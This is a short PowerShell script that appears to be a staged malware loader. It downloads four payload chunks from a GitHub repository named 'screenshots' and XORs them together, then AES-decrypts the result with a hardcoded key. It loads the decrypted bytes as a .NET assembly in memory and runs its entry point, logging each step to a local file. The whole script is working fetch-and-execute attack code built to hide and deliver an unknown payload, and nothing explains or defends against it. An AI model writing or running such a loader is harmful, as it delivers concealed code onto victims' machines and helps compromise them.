$log="C:\temp\chain_log.txt"
"Starting chain"|Out-File $log -Force
try{
"Step1: Downloading chunks"|Out-File $log -Append
$c=New-Object Net.WebClient
$ch=@()
0..3|%{
    try{$ch+=$c.DownloadData('https://raw.githubusercontent.com/cem324/screenshots/main/c'+$_)}catch{$ch+=0..287|%{0}}
    "  chunk$_ done"|Out-File $log -Append
}
"Step2: XOR"|Out-File $log -Append
$xr=[byte[]]$ch[0].Clone()
1..3|%{$i=$_;0..($xr.Length-1)|%{$xr[$_]=$xr[$_]-bxor$ch[$i][$_]}}
"Step3: AES decrypt"|Out-File $log -Append
$k=[Byte[]]@(0x66,0xf4,0x7d,0xe8,0x5f,0x6e,0x8a,0x7f,0xbf,0xdf,0x63,0xb4,0x57,0xbd,0xb6,0x6a)
$iv=[byte[]]$xr[0..15]
$ae=[Security.Cryptography.Aes]::Create()
$ae.Key=$k
$ae.IV=$iv
$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
"Step4: Assembly size=$($py.Length)"|Out-File $log -Append
try{[System.Reflection.Assembly]::Load($py).EntryPoint.Invoke(0,@(,$null));"Step5: Exec OK"|Out-File $log -Append}catch{"Step5 fail: $_"|Out-File $log -Append}
}catch{"FATAL: $_"|Out-File $log -Append}
